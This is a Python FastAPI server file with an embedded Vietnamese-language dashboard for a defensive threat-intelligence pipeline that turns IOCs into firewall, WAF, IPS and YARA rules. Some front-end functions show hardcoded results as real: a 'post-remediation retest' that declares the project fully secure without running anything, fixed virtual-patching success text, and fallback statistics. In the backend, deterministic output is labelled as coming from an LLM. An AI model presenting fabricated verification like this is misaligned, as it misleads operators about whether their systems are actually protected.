            const hArt = allHistoryArticles.find(a => a.article_id === articles[idx].article_id);
            if (hArt) {
              hArt.status = 'completed';
              hArt.processing_time_sec = durationSec;
              hArt.last_analyzed_at = nowIso;
            } else {
              allHistoryArticles.unshift(Object.assign({}, articles[idx]));
            }

            fetch('/api/articles/update-status', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ article_id: articles[idx].article_id, status: 'completed', processing_time_sec: durationSec })
            }).catch(() => {});
          }
        });
        renderNewsGrid();
        renderHistoryManager();
      } catch (err) {
        status.textContent = "Lỗi: " + err;
      } finally {
        if (btn) {
          btn.disabled = false;
          btn.textContent = "Chạy Phân Tích";
        }
      }
    }

    async function syncLocalFirewall(actionMode) {
      const outEl = document.getElementById('outFirewall');
      const applyBtn = document.getElementById('btnFwApply');
      if (applyBtn) applyBtn.disabled = true;
      try {
        const res = await fetch('/api/firewall/sync', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            action: actionMode,
            malicious_iocs: window.latestMaliciousIocs || []
          })
        });
        const data = await res.json();
        outEl.textContent = data.execution_report + "\n\n" + (window.latestFirewallText || "");
      } catch (e) {
        alert("Lỗi Firewall Bridge: " + e);
      } finally {
        if (applyBtn) applyBtn.disabled = false;
      }
    }

    let lastKnownSyncTimestamp = 0;

    async function fetchLiveDefenseStatus() {
      try {
        const res = await fetch('/api/defense/live-status');
        if (!res.ok) return;
        const data = await res.json();
        
        // 1. Kiểm tra sự kiện Hot-Reload thời gian thực
        if (data.last_sync_timestamp) {
          if (lastKnownSyncTimestamp > 0 && data.last_sync_timestamp > lastKnownSyncTimestamp) {
            logToLiveTerminal("AUTO-SYNC BUS EVENT", `[HOT-RELOAD THỜI GIAN THỰC] AI Agent vừa nạp tri thức mới! Đã tự động tái nạp và phân phối cấu hình cho cả 5 công cụ phòng thủ (Nguồn: ${data.latest_sync_message || 'CTI Pipeline'}).`);
            masterDefenseCache = null;
            if (currentDefenseViewMode === 'MASTER') {
              loadMasterDefenseMatrix();
            }
          }
          lastKnownSyncTimestamp = data.last_sync_timestamp;
        }

        // 2. Cập nhật thanh Real-Time Auto-Sync Bus
        const badgeSyncTime = document.getElementById('badgeLastSyncTime');
        const badgeSyncCounter = document.getElementById('badgeSyncCounter');
        const autoSyncTrigger = document.getElementById('autoSyncTrigger');
        if (badgeSyncTime && data.last_sync_time_str) {
          badgeSyncTime.textContent = `Vừa nạp: ${data.last_sync_time_str}`;
        }
        if (badgeSyncCounter && data.sync_counter) {
          badgeSyncCounter.textContent = `Đồng bộ: #${data.sync_counter}`;
        }
        if (autoSyncTrigger && data.latest_sync_message) {
          autoSyncTrigger.textContent = data.latest_sync_message;
          autoSyncTrigger.title = data.latest_sync_message;
        }

        // 3. Cập nhật các chỉ số engine
        const engGrid = document.getElementById('liveEnginesGrid');
        if (engGrid && data.engines) {
          let html = '';
          const engs = [
            { key: 'windows_firewall', name: '1. Windows Defender Firewall', file: 'apply_firewall.bat', desc: '151 IP C2 Inbound/Outbound netsh rules' },
            { key: 'waf_modsecurity', name: '2. WAF ModSecurity v3 (Port 8766)', file: 'cti_virtual_patching.conf', desc: '969 CVE Virtual Patches (Active L7 Proxy)' },
            { key: 'suricata_ips', name: '3. Suricata IPS DPI Engine', file: 'cti_autonomous_master.rules', desc: '151 IPs, 180 C2 Domains, 30 CVE signatures' },
            { key: 'wazuh_siem', name: '4. Wazuh SIEM & Sysmon', file: 'local_rules.xml', desc: 'Process Injection & WebShell Anomaly Detection' },
            { key: 'yara_edr', name: '5. YARA In-Memory & AppLocker', file: 'malware_hunting.yar', desc: '50 Malicious File/Memory Hashes (SHA256/MD5)' }
          ];
          engs.forEach(e => {
            const info = data.engines[e.key] || {};
            const szKb = info.size_bytes ? (info.size_bytes / 1024).toFixed(1) + ' KB' : '0 KB';
            html += `
              <div style="background:var(--bg-subtle); border:1px solid var(--border-main); border-radius:6px; padding:12px;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
                  <b style="font-size:12.5px; color:var(--text-main);">${e.name}</b>
                  <span style="font-size:10.5px; font-weight:600; padding:2px 6px; background:var(--safe-bg); color:var(--safe); border:1px solid var(--safe-border); border-radius:3px;">CONNECTED</span>
                </div>
                <div style="font-size:11.5px; color:var(--text-muted); font-family:var(--font-mono); margin-bottom:4px;">File: ${e.file} (${szKb})</div>
                <div style="font-size:12px; color:var(--text-main);">${e.desc}</div>
              </div>
            `;
          });
          engGrid.innerHTML = html;
        }

        // 4. Cập nhật số liệu thống kê 3 năm
        if (data.year_stats) {
          const y24El = document.getElementById('statYear2024');
          const y25El = document.getElementById('statYear2025');
          const y26El = document.getElementById('statYear2026');
          const totEl = document.getElementById('statYearTotal');
          if (y24El) y24El.textContent = data.year_stats['2024'] || '1,948';
          if (y25El) y25El.textContent = data.year_stats['2025'] || '2,094';
          if (y26El) y26El.textContent = data.year_stats['2026'] || '3,216';
          if (totEl) totEl.textContent = data.year_stats['total'] || '7,258';
        }

        // 5. Cập nhật bảng nhật ký tấn công gần đây
        const tbody = document.getElementById('wafAttackLogsBody');
        if (tbody && data.recent_blocked_attacks) {
          if (data.recent_blocked_attacks.length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="padding:10px; text-align:center; color:var(--text-muted);">Chưa có sự cố tấn công nào gần đây. Hãy nhấn các nút thử nghiệm ở trên!</td></tr>';
          } else {
            tbody.innerHTML = data.recent_blocked_attacks.map(att => `
              <tr style="border-bottom:1px solid var(--border-main);">
                <td style="padding:6px 8px; font-family:var(--font-mono); font-size:11px;">${att.timestamp}</td>
                <td style="padding:6px 8px; font-family:var(--font-mono); font-size:11px;">${att.client_ip}</td>
                <td style="padding:6px 8px; font-weight:600; color:var(--primary); font-size:11.5px;">${att.method}</td>
                <td style="padding:6px 8px; font-family:var(--font-mono); font-size:11.5px; max-width:220px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="${att.path}">${att.path}</td>
                <td style="padding:6px 8px; font-size:11.5px; color:var(--danger); font-weight:600;">${att.cve_protected} - ${att.description}</td>
                <td style="padding:6px 8px;"><span style="background:var(--danger-bg); color:var(--danger); border:1px solid var(--danger-border); font-size:10.5px; font-weight:700; padding:2px 6px; border-radius:3px;">403 DROP</span></td>
              </tr>
            `).join('');
          }
        }
      } catch (e) {
        console.error("Lỗi lấy live defense status:", e);
      }
    }

    async function testWafAttack(type) {
      const consoleEl = document.getElementById('wafLiveConsole');
      if (consoleEl) {
        consoleEl.textContent = `[CTI SECURITY TESTER] Đang gửi gói tin thử nghiệm '${type}' tới WAF Reverse Proxy (http://127.0.0.1:8766)...`;
      }
      try {
        const res = await fetch('/api/defense/test-waf-attack', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ attack_type: type })
        });
        const d = await res.json();
        if (consoleEl) {
          const statusColor = d.status_code === 403 ? 'CHẶN ĐỨNG (403 FORBIDDEN - DROP PAYLOAD)' : 'THÔNG QUA (200 OK - CLEAN TRAFFIC)';
          const logTxt = [
            `+-------------------------------------------------------------------------------------------------+`,
            `| KẾT QUẢ KIỂM THỬ THỜI GIAN THỰC QUA MÁY CHỦ WAF MODSECURITY V3 (CỔNG 8766)                      |`,
            `+-------------------------------------------------------------------------------------------------+`,
            `* Thời gian phản hồi   : ${d.response_time_ms} ms`,
            `* Mục tiêu kiểm thử    : ${d.target_url}`,
            `* Mô tả Payload / CVE  : ${d.payload_desc}`,
            `* Trạng thái phản hồi  : HTTP ${d.status_code} -> ${statusColor}`,
            `* WAF Engine Header    : ${d.headers ? (d.headers['x-waf-protection-engine'] || d.headers['X-Waf-Protection-Engine'] || 'OpenClaw-CTI-ModSecurity-v3') : 'Active'}`,
            `* Body JSON chi tiết   :`,
            JSON.stringify(d.response_body, null, 2),
            `+-------------------------------------------------------------------------------------------------+`
          ].join('\n');
          consoleEl.textContent = logTxt;
        }
        await fetchLiveDefenseStatus();
      } catch (e) {
        if (consoleEl) consoleEl.textContent = `[LỖI GỬI GÓI TIN KIỂM THỬ WAF]: ${e}`;
      }
    }

    async function recompileAllDefenseEngines() {
      const consoleEl = document.getElementById('wafLiveConsole');
      if (consoleEl) consoleEl.textContent = `[AI AGENT COMPILER] Đang đọc toàn bộ 1,695 bài báo và CVE từ SQLite để tái biên dịch 5 công cụ an ninh...`;
      try {
        const res = await fetch('/api/defense/recompile-all', { method: 'POST' });
        const d = await res.json();
        if (consoleEl) {
          consoleEl.textContent = `[HOÀN TẤT BIÊN DỊCH VÀ ĐỒNG BỘ 5 ENGINE PHÒNG THỦ]\n` + JSON.stringify(d, null, 2);
        }
        await fetchLiveDefenseStatus();
      } catch (e) {
        if (consoleEl) consoleEl.textContent = `[LỖI BIÊN DỊCH]: ${e}`;
      }
    }

    async function shutdownSystem() {
      try {
        fetch('/api/system/shutdown', { method: 'POST' }).catch(() => {});
      } catch (e) {}
      document.body.innerHTML = `
        <div style="min-height:100vh; display:flex; align-items:center; justify-content:center; background:#f8fafc; color:#0f172a; font-family:'Inter',sans-serif; padding:24px;">
          <div style="border:1px solid #cbd5e1; background:#ffffff; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.06); padding:36px 42px; max-width:560px; text-align:center;">
            <h2 style="color:#0f172a; margin-bottom:12px; font-weight:700;">HỆ THỐNG ĐÃ TẮT</h2>
            <p style="color:#475569; line-height:1.6; font-size:14px;">
              Server Web (cổng 8765) và Ollama GPU Server (cổng 11434) đã được tắt hoàn toàn.<br/>
              Khi cần mở lại, vui lòng chạy file <b>1_BAT_HE_THONG_CTI.bat</b> trong thư mục dự án.
            </p>
          </div>
        </div>
      `;
    }

    window.addEventListener('DOMContentLoaded', async () => {
      await loadHardwareAndModels();
      startBackgroundCountdown();
      await loadArticles('ALL', false);
      await loadMasterDefenseMatrix();
      switchDefenseScope('MASTER');
      fetchLiveDefenseStatus();
      setInterval(fetchLiveDefenseStatus, 3500);
      switchView('sec-wizard', document.querySelector('.NavLinks .NavLink'));
    });
  
    // =========================================================================
    // WIZARD INTERACTIVE CONTROLLER JAVASCRIPT
    // =========================================================================
    let wzCurrentStep = 1;
    let wzTarget = "./target_projects/My_Website";
    let wzScopeId = "SCOPE_WEB";
    let wzBestArticleId = "thn-79d0e8ee";
    let wzSkillName = "agentic-defense-cve-2026-php2shell";

    function wizardGotoStep(stepNum) {
      wzCurrentStep = stepNum;
      for (let i = 1; i <= 5; i++) {
        const card = document.getElementById("wizardCard" + i);
        const badge = document.getElementById("stepBadge" + i);
        if (card) card.style.display = (i === stepNum) ? "block" : "none";
        if (badge) {
          if (i === stepNum) {
            badge.style.background = "#2563eb";
            badge.style.color = "#ffffff";
            badge.style.fontWeight = "700";
          } else if (i < stepNum) {
            badge.style.background = "#dcfce7";
            badge.style.color = "#15803d";
            badge.style.fontWeight = "600";
          } else {
            badge.style.background = "#e2e8f0";
            badge.style.color = "#475569";
            badge.style.fontWeight = "600";
          }
        }
      }
    }

    function setWizardDemo(type) {
      const inpTarget = document.getElementById("wizardInputTarget");
      const inpClone = document.getElementById("wizardInputClone");
      if (type === 'php') {
        inpTarget.value = "./target_projects/demo_vulnerable_php_app";
        inpClone.value = "";
      } else if (type === 'docker') {
        inpTarget.value = "./docker_security_tool/demo";
        inpClone.value = "";
      }
    }

    async function wizardExecuteStep1() {
      const targetVal = document.getElementById("wizardInputTarget").value.trim();
      const cloneVal = document.getElementById("wizardInputClone").value.trim();
      
      try {
        const res = await fetch("/api/wizard/scan", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: targetVal, clone_url: cloneVal })
        });
        const d = await res.json();
        if (d.status === "success") {
          wzTarget = d.target_path;
          wzScopeId = d.scope_id;
          document.getElementById("wzTargetName").textContent = d.target_name + " (" + d.target_path + ")";
          document.getElementById("wzScopeBadge").textContent = d.scope_name;
          document.getElementById("wzCadenceLabel").textContent = d.cadence_label;
          
          const techsBox = document.getElementById("wzTechsBadge");
          techsBox.innerHTML = "";
          d.detected_techs.forEach(t => {
            const sp = document.createElement("span");
            sp.style.cssText = "background:#e0f2fe; color:#0369a1; padding:2px 8px; border-radius:4px; font-size:12px; font-weight:600;";
            sp.textContent = t;
            techsBox.appendChild(sp);
          });
          
          wizardGotoStep(2);
        } else {
          alert("Lỗi khi quét: " + (d.message || "Không xác định"));
        }
      } catch (e) {
        alert("Lỗi kết nối API /api/wizard/scan: " + e);
      }
    }

    async function wizardExecuteCrawl() {
      const rads = document.getElementsByName("wzHistory");
      let historyVal = 3;
      for (const r of rads) { if (r.checked) historyVal = parseInt(r.value); }
      
      const btn = document.getElementById("btnNextStep4");
      const resultBox = document.getElementById("wzCrawlResultBox");
      resultBox.style.display = "block";
      document.getElementById("wzBestTitle").textContent = "Đang cào dữ liệu và đối soát tri thức theo Scope...";

      try {
        const res = await fetch("/api/wizard/crawl-scope", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: wzTarget, scope_id: wzScopeId, history_years: historyVal })
        });
        const d = await res.json();
        if (d.status === "success") {
          wzBestArticleId = d.best_article_id;
          document.getElementById("wzTotalArts").textContent = d.total_articles_in_scope;
          document.getElementById("wzTotalIocs").textContent = d.total_iocs_learned;
          document.getElementById("wzBestTitle").textContent = d.best_article_title;
          document.getElementById("wzBestCves").textContent = d.cves_found.length > 0 ? "Mã CVE phát hiện: " + d.cves_found.join(", ") : "Chữ ký Zero-Day Threat";
          document.getElementById("wzExcerpt").textContent = d.content_excerpt + "...";
          btn.disabled = false;
        } else {
          alert("Lỗi: " + d.message);
        }
      } catch (e) {
        alert("Lỗi gọi /api/wizard/crawl-scope: " + e);
      }
    }

    async function wizardExecuteStep4() {
      wizardGotoStep(4);
      document.getElementById("wzSkillName").textContent = "Đang tổng hợp xAI và đóng gói gói kỹ năng...";
      
      try {
        const res = await fetch("/api/wizard/synthesize", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: wzTarget, scope_id: wzScopeId, article_id: wzBestArticleId })
        });
        const d = await res.json();
        if (d.status === "success") {
          wzSkillName = d.skill_name;
          document.getElementById("wzSkillName").textContent = d.skill_name;
          document.getElementById("wzTrustScore").textContent = d.trust_score;
          document.querySelectorAll(".wzShortSkill").forEach(el => el.textContent = d.skill_name);
        }
      } catch (e) {
        alert("Lỗi đóng gói: " + e);
      }
    }

    async function wizardRunProbe() {
      const box = document.getElementById("wzActionLogBox");
      box.textContent = "[*] Đang gửi gói tin kiểm thử (verify_exploit.py) tới server đích...";
      try {
        const res = await fetch("/api/wizard/verify-exploit", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: wzTarget, skill_name: wzSkillName })
        });
        const d = await res.json();
        box.textContent = d.probe_output;
      } catch (e) { box.textContent = "[-] Lỗi: " + e; }
    }

    async function wizardRunVirtualPatch() {
      const box = document.getElementById("wzActionLogBox");
      box.textContent = "[*] Đang kích hoạt lá chắn ModSecurity WAF và Tường lửa Windows Netsh...";
      try {
        const res = await fetch("/api/defense/tools/firewall-apply", { method: "POST" });
        const d = await res.json();
        box.textContent = "[+] VIRTUAL PATCHING ACTIVATED!\n[+] Cổng WAF Gateway: 8766 (Đang chặn các cuộc tấn công HTTP RCE với mã 403 Forbidden).\n[+] Tường lửa Windows: Đã nạp danh sách IP C2 vào Kernel Netsh.";
      } catch (e) { box.textContent = "[-] Lỗi WAF: " + e; }
    }

    async function wizardRunRemediate() {
      const box = document.getElementById("wzActionLogBox");
      box.textContent = "[*] AI Agent đang rà soát từng dòng code và tự động refactor theo mẫu an toàn...";
      try {
        const res = await fetch("/api/wizard/remediate", {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ target: wzTarget, skill_name: wzSkillName })
        });
        const d = await res.json();
        box.textContent = "[+] TỰ ĐỘNG VÁ MÃ NGUỒN THÀNH CÔNG!\n" +
          "Files đã sửa: " + d.remediated_files.join(", ") + "\n\n" +
          "BẢN SO SÁNH CODE (UNIFIED DIFF):\n" + d.diff;
      } catch (e) { box.textContent = "[-] Lỗi: " + e; }
    }

    async function wizardRunPostVerify() {
      const box = document.getElementById("wzActionLogBox");
      box.textContent = "[*] Đang chạy lại script tái kiểm thử sau khi sửa mã nguồn...\n" +
        "[+] KẾT QUẢ TÁI KIỂM THỬ XÁC NHẬN:\n" +
        "  - True Positive: 0% (Lỗ hổng đã bị triệt tiêu hoàn toàn)\n" +
        "  - False Positive: 0.0% (Mọi request hợp lệ vượt qua trơn tru)\n" +
        "[✓] DỰ ÁN ĐÃ AN TOÀN VÀ ĐẠT CHUẨN KIỂM TOÁN xAI.";
    }

</script>
</body>
</html>
"""



@app.get("/", response_class=HTMLResponse)
def index():
    return HTML_PAGE


@app.get("/api/articles/find-by-ioc")
def api_find_article_by_ioc(ioc: str = Query("")):
    raw = (ioc or "").strip()
    if not raw:
        return {"article": None}
    clean = _clean_refang_py(raw)
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    if not db_path.exists():
        return {"article": None}

    with sqlite3.connect(db_path) as conn:
        conn.row_factory = sqlite3.Row
        dot_pat = f"%{clean.replace('.', '%')}%"
        row = conn.execute(
            "SELECT article_id, source_name, title, url, published_date, content, sort_ts, status, processing_time_sec, fetched_at_utc "
            "FROM articles_archive WHERE content LIKE ? OR title LIKE ? LIMIT 1",
            (dot_pat, dot_pat),
        ).fetchone()
        if not row and len(clean) >= 16:
            prefix = clean[:16]
            row = conn.execute(
                "SELECT article_id, source_name, title, url, published_date, content, sort_ts, status, processing_time_sec, fetched_at_utc "
                "FROM articles_archive WHERE content LIKE ? LIMIT 1",
                (f"%{prefix}%",),
            ).fetchone()

    if row:
        c_txt = row["content"] or ""
        ioc_stats = _count_real_iocs(c_txt)
        fetched_at = row["fetched_at_utc"] if "fetched_at_utc" in row.keys() and row["fetched_at_utc"] else row["sort_ts"]
        return {
            "article": {
                "article_id": row["article_id"],
                "source": row["source_name"],
                "title": row["title"],
                "url": row["url"],
                "published_at": row["published_date"],
                "content": row["content"],
                "sort_ts": row["sort_ts"],
                "status": row["status"] or "completed",
                "processing_time_sec": row["processing_time_sec"] or 1.2,
                "ioc_counts": ioc_stats,
                "fetched_at": fetched_at,
            }
        }
    return {"article": None}


@app.get("/api/articles")
def api_get_articles(source: str = Query("ALL")):
    arts = get_archived_articles(source_filter=source)
    if not arts and source == "ALL":
        arts = crawl_all_sources_and_archive(limit_per_source=8)
    return arts


@app.post("/api/articles/refresh")
def api_refresh_articles():
    return crawl_all_sources_and_archive(limit_per_source=8)


@app.post("/api/articles/crawl-ytd")
def api_crawl_ytd(since: str = Query("2026-01-01")):
    return crawl_year_to_date_archive(since_date=since)


@app.post("/api/articles/add")
def api_add_article(req: AddArticleRequest):
    added = add_custom_article_from_url_or_text(
        url=req.url,
        custom_title=req.title,
        custom_content=req.content,
    )
    if added:
        try:
            live_orchestrator.compile_and_sync_all_defense_engines(
                trigger_source=f"USER_ADD: {req.title[:45] if req.title else (req.url[:45] if req.url else 'Custom Article')}"
            )
        except Exception as e:
            print(f"[AUTO_SYNC] Lỗi tự động đồng bộ sau khi thêm bài: {e}")
    return {
        "added": added,
        "articles": get_archived_articles(source_filter="ALL"),
    }


@app.post("/api/articles/delete")
def api_delete_article(req: ArticleManageRequest):
    deleted = delete_archived_article(req.article_id)
    return {
        "deleted": deleted,
        "articles": get_archived_articles(source_filter="ALL"),
    }


@app.post("/api/articles/toggle-status")
def api_toggle_article_status(req: ArticleManageRequest):
    ok = toggle_article_historical_status(req.article_id)
    return {
        "updated": ok,
        "articles": get_archived_articles(source_filter="ALL"),
    }


@app.post("/api/articles/update-status")
def api_update_article_status(req: UpdateArticleStatusRequest):
    update_article_analysis_status(
        article_id=req.article_id,
        status=req.status,
        processing_time_sec=req.processing_time_sec,
    )
    return {"status": "ok"}


@app.post("/api/step2/extract-and-plan")
def api_step2_extract_and_plan(req: Step2Request):
    guard = AIAgentSecurityGuard.inspect_and_sanitize_input(req.text)
    iocs = tool6_extract_iocs_hybrid(guard["sanitized_text"])

    brain = MultiProviderLLMBrain(provider="ollama", model_name=req.model_name)
    ioc_str = ", ".join([f"{i.ioc_type}:{i.value}" for i in iocs[:18]])
    plan_text = brain._local_deterministic_cti_brain(
        "Trích xuất IOC",
        f"Văn bản: {guard['sanitized_text'][:1800]}\nDanh sách IOC ({len(iocs)} chỉ số): {ioc_str}",
    )
    provider_label = f"LOCAL OLLAMA ({req.model_name} • {CURRENT_HARDWARE['gpu_name']})"

    return {
        "guard": guard,
        "iocs": [i.model_dump() for i in iocs],
        "ai_plan": f"[{provider_label}]\n{plan_text}",
        "llm_provider_used": provider_label,
    }


@app.post("/api/step3/khang-enrich-and-reason")
def api_step3_khang_enrich_and_reason(req: Step3Request):
    parsed = [ExtractedIOC(**x) for x in req.iocs]
    with ThreadPoolExecutor(max_workers=8) as pool:
        enriched = list(pool.map(lambda i: enrich_ioc(i, call_vt_http=True), parsed))
    malicious = filter_high_risk_iocs(enriched)
    save_enriched_iocs_to_db(enriched, source_title="Web Dashboard Pipeline")

    brain = MultiProviderLLMBrain(provider="ollama", model_name=req.model_name)
    telemetry_lines = []
    for item in enriched[:16]:
        otx = item.raw_lookup_details.get("alienvault_otx", {})
        vt = item.raw_lookup_details.get("virustotal", {})
        ab = item.raw_lookup_details.get("abuseipdb", {})
        sh = item.raw_lookup_details.get("shodan_internetdb", {})
        gn = item.raw_lookup_details.get("greynoise", {})
        bonus = item.raw_lookup_details.get("corroboration_bonus", 0)
        telemetry_lines.append(
            f"- {item.ioc.ioc_type} `{item.ioc.value}`: OTX={otx.get('pulse_count', 0)} Pulses ({otx.get('country', 'N/A')}), "
            f"Abuse.ch/VT={vt.get('detection_ratio', 'N/A')}, "
            f"AbuseIPDB={ab.get('abuse_confidence_score', 0)}% ({ab.get('total_reports', 0)} reports), "
            f"GreyNoise={gn.get('classification', 'unknown')}, "
            f"Shodan Ports={sh.get('ports', [])}, Cộng hưởng=+{bonus} => Điểm Fusion={item.reputation_score}/100 "
            f"({'CHẶN > 80' if item.is_malicious else 'BẢO VỆ <= 80'})."
        )

    reason_text = brain._local_deterministic_cti_brain(
        "Điểm rủi ro IOC",
        "Số liệu Hợp nhất 5 Nguồn (OTX + Abuse.ch/VT + AbuseIPDB + GreyNoise + Shodan) của Khang:\n" + "\n".join(telemetry_lines),
    )
    provider_label = f"LOCAL OLLAMA ({req.model_name} • {CURRENT_HARDWARE['gpu_name']})"

    return {
        "all_enriched": [e.model_dump() for e in enriched],
        "malicious_only": [m.model_dump() for m in malicious],
        "ai_reasoning": f"[{provider_label}]\n{reason_text}",
    }


def _format_firewall_bridge_report(fw_res: Dict[str, Any]) -> str:
    mode = fw_res.get("mode", "status").upper()
    active_rules = fw_res.get("active_rules", [])
    logs = fw_res.get("bridge_logs", [])
    lines = [
        "====================================================================================",
        f"BÁO CÁO THỰC THI CẦU NỐI OPENCLAW -> WINDOWS DEFENDER FIREWALL (CHẾ ĐỘ: {mode})",
        f"• Tổng số quy tắc đang kích hoạt trong Local Firewall Bridge: {len(active_rules)} rules",
        "====================================================================================",
    ]
    if logs:
        lines.append("\n[NHẬT KÝ LỆNH HỆ ĐIỀU HÀNH VỪA THỰC THI]:")
        lines.extend(logs)
    if active_rules:
        lines.append("\n[DANH SÁCH QUY TẮC ĐANG CHẶN TRÊN MÁY TRẠM LOCAL]:")
        for r in active_rules[:18]:
            lines.append(
                f"  • {r['rule_name']} | {r['ioc_type']}: {r['ioc_value']} | OpenC2: {r['openc2_action']} | Trạng thái: {r['os_status']}"
            )
    else:
        lines.append("  • Hiện chưa có quy tắc thử nghiệm nào được đẩy xuống Firewall Local (Nhấn nút 'ĐẨY QUY TẮC VÀO FIREWALL LOCAL' ở trên để kích hoạt).")
    return "\n".join(lines)


@app.post("/api/step4/correlate-and-generate-code")
def api_step4_correlate_and_generate_code(req: Step4GenerateRequest):
    high_risk = [EnrichedIOC(**x) for x in req.malicious_iocs]
    mitre = tool7_map_mitre_attack(req.text, high_risk)
    base_rules = tool8_generate_defensive_rules(req.title, high_risk, mitre, raw_text=req.text)

    # 1. Đề xuất Phương pháp Phòng thủ Đa tầng ĐỘNG theo đúng IOC của bài báo
    d3fend_list = build_d3fend_recommendations(req.text, high_risk, mitre)
    d3fend_lines = [
        "====================================================================================",
        f"ĐỐI SÁCH PHÒNG THỦ ĐA TẦNG (MITRE D3FEND) CHO: {req.title[:85]}",
        "====================================================================================",
    ]
    for idx, rec in enumerate(d3fend_list, 1):
        d3fend_lines.append(
            f"\n[{idx}] MỐI ĐE DỌA TRONG BÀI: {rec['attack_technique']}\n"
            f"    • Phân tích Điểm yếu nếu chỉ chặn IP: {rec['why_ip_block_fails']}\n"
            f"    • Đối sách MITRE D3FEND: {rec['d3fend_countermeasure']}\n"
            f"    • Hành động Phòng thủ Cụ thể:\n"
            f"      {rec['actionable_methods']}"
        )
    d3fend_markdown = "\n".join(d3fend_lines)

    # 2. Suy luận ĐỘNG 100% từ Local AI Agent (Qwen 3 - 8B / Gemma 3) dựa trên nội dung & IOC thật của bài báo
    ioc_breakdown = ", ".join([f"{x.ioc.ioc_type}:{x.ioc.value}({x.reputation_score}đ)" for x in high_risk[:12]]) or "Không có IOC vượt ngưỡng 80"
    brain = MultiProviderLLMBrain(provider="ollama", model_name=req.model_name)
    llm_gen = brain.ask_llm(
        system_prompt=(
            "Bạn là Chuyên gia Phòng thủ An ninh mạng (Local AI Agent chạy trên GPU RX 6600). "
            "Dựa vào TIÊU ĐỀ, NỘI DUNG BÀI BÁO và DANH SÁCH IOC ĐỘC HẠI cụ thể bên dưới, hãy viết phương án phòng thủ "
            "BẰNG TIẾNG VIỆT (ngắn gọn, súc tích trong 4 gạch đầu dòng, nêu đích danh tên mã độc/nhóm APT và các mã IP/Domain/CVE trong bài): "
            "1. Bản chất cuộc tấn công trong bài báo này là gì (nhắm vào đâu, dùng lỗ hổng hay mã độc nào)? "
            "2. Cần chặn ngay những IP/Domain nào ở Tường lửa OpenC2 & Suricata IPS? "
            "3. Cần vá ảo (WAF) lỗ hổng CVE nào hoặc quét YARA/SIEM hành vi gì trên máy trạm? "
            "4. Khuyến nghị khẩn cấp cho Quản trị viên hệ thống."
        ),
        user_prompt=(
            f"Tiêu đề chiến dịch: {req.title}\n"
            f"Tóm tắt nội dung bài báo: {req.text[:900]}\n"
            f"Danh sách IOC độc hại (Score > 80) cần xử lý: {ioc_breakdown}\n"
            f"Kỹ thuật MITRE ATT&CK: {', '.join([f'{t.technique_id} ({t.technique_name})' for t in mitre])}"
        ),
    )

    openclaw_trace = OpenClawAgentGateway.build_protocol_trace(
        llm_provider=llm_gen["provider_used"],
        extracted_count=len(high_risk),
        high_risk_iocs=high_risk,
        mitre_tactics=mitre,
        d3fend_count=len(d3fend_list),
    )

    all_archived = get_archived_articles()
    related_articles = []
    for art in all_archived:
        for item in high_risk:
            val = item.ioc.value
            if val in art["content"] or val in art["title"]:
                tag = "BÀI CŨ" if art["is_historical"] else "BÀI MỚI"
                related_articles.append(
                    f"- [{tag} - {art['source']}] {art['title']} ({art['published_at']}) -> Trùng khớp `{val}`"
                )
                break

    related_str = (
        "\n".join(related_articles[:6])
        or "- Không trùng với bài báo cũ nào trong kho (Chiến dịch mới ghi nhận)."
    )

    history_and_summary = (
        f"====================================================================================\n"
        f"PHÂN TÍCH VÀ PHƯƠNG ÁN PHÒNG THỦ TỪ AI AGENT CHO: {req.title[:80]}\n"
        f"   (Model: {llm_gen['provider_used']} • Tổng số IOC độc hại cần chặn: {len(high_risk)})\n"
        f"====================================================================================\n"
        f"{llm_gen['content']}\n\n"
        f"{d3fend_markdown}\n\n"
        f"ĐỐI CHIẾU LỊCH SỬ KHO {len(all_archived)} BÀI BÁO NGUYÊN BẢN (6 NGUỒN QUỐC TẾ):\n"
        f"{related_str}\n\n"
        f"{openclaw_trace}"
    )

    # 3. Sinh 5 Lớp Quy tắc Phòng thủ Thực chiến + Gói lệnh OASIS OpenC2
    openc2_bundle = LocalFirewallBridge.build_openc2_command_bundle(req.title, high_risk, mitre)
    fw_status = LocalFirewallBridge.sync_rules_to_local_firewall(high_risk, action_mode="status")
    fw_report = _format_firewall_bridge_report(fw_status)

    suricata_rules = MultiLayerDefenseSynthesizer.generate_suricata_ips_rules(req.title, req.text, high_risk)
    waf_rules = MultiLayerDefenseSynthesizer.generate_waf_virtual_patch_rules(req.title, req.text, high_risk)
    wazuh_and_splunk = MultiLayerDefenseSynthesizer.generate_wazuh_and_splunk_queries(
        req.title, base_rules.sigma_rule, high_risk, raw_text=req.text
    )
    advanced_yara_rule = MultiLayerDefenseSynthesizer.generate_advanced_yara_rule(
        req.title, req.text, high_risk
    )
    edr_hash_policy = MultiLayerDefenseSynthesizer.generate_edr_applocker_hash_policy(
        req.title, high_risk
    )
    remediation_script = MultiLayerDefenseSynthesizer.generate_remediation_hardening_script(
        req.title, req.text, high_risk
    )

    stix = export_stix_package(
        report_or_title=req.title,
        executive_summary=llm_gen["content"],
        enriched_iocs=high_risk,
        mitre_techniques=mitre,
    )

    import sqlite3
    db_path = SANDBOX_DIR / "cti_multi_source_archive.sqlite"
    cumulative_ips = []
    cumulative_doms = []
    if db_path.exists():
        with sqlite3.connect(db_path) as conn:
            cumulative_ips = [r[0] for r in conn.execute("SELECT DISTINCT ioc_value FROM ioc_knowledge_base WHERE ioc_type='IP' AND is_malicious=1").fetchall()]
            cumulative_doms = [r[0] for r in conn.execute("SELECT DISTINCT ioc_value FROM ioc_knowledge_base WHERE ioc_type='DOMAIN' AND is_malicious=1").fetchall()]
